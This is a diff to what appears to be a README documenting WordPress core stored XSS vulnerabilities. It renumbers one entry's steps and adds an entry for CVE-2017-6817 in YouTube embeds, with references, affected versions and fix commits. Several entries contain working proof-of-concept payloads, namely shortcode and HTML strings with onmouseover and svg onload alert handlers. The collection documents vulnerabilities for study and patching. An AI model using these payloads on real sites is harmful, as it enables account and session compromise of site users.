@@ -55,15 +55,15 @@ XSS vulnarability allows a user with posting capabilities to compomise the web s
 <b>Step by step:</b>
 1. Press "Create a Post" button
 2. Switch from visual editor to text editor by choosing a "Text" tab on the righ upper corner.
-2. Enter example code that triggers alert message:
+3. Enter example code that triggers alert message:
 ```html
 <a href="[caption code=">]</a><a title=" onmouseover=alert('test')  ">link</a>
 ```
-3. WordPress shortcode processing manipulates this into the following form
+4. WordPress shortcode processing manipulates this into the following form
 ```html
 <a href="</a><a title=" onmouseover=alert('test')  ">link</a>
 ```
-4. The code is executed when the user move his cursor over the link 
+5. The code is executed when the user move his cursor over the link 
 
 <b>Affected Source Code Link:</b> https://core.trac.wordpress.org/changeset/33359
 
@@ -124,4 +124,33 @@ XSS exploit [caption width='1' caption='<a href="' ">]</a><a href="http://onMous
 
 <b>Affected Source Code Link:</b> https://github.com/WordPress/WordPress/commit/f72b21af23da6b6d54208e5c1d65ececdaa109c8
 
+# Wordpress exploit #5
+<b>Type:</b> Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds CVE-2017-6817
 
+<b>Wordpress exploit demo</b>
+
+<img src="exploit5.gif" width="800">
+
+[!] Title: WordPress  4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds<br /> 
+    Reference: https://wpvulndb.com/vulnerabilities/8768 <br /> 
+    Reference: https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/  <br /> 
+    Reference: https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8  <br /> 
+    Reference: https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html  <br /> 
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6817  <br /> 
+
+<b>Tested in:</b> 4.2
+
+<b>Fixed in:</b> 4.2.13
+
+<b>Description:</b>
+There is authenticated XSS vulnarability in YouTube URL Embeds
+
+<b>Step by step:</b>
+1. Press "Create a Post" button
+2. Enter example code that contains url embeds that triggers alert message:
+```html
+[embed src='https://youtube.com/embed/12345\x3csvg onload=alert(1)\x3e'][/embed]
+```
+3. The code is executed when the user move his cursor over the link 
+
+<b>Affected Source Code Link:</b> https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8
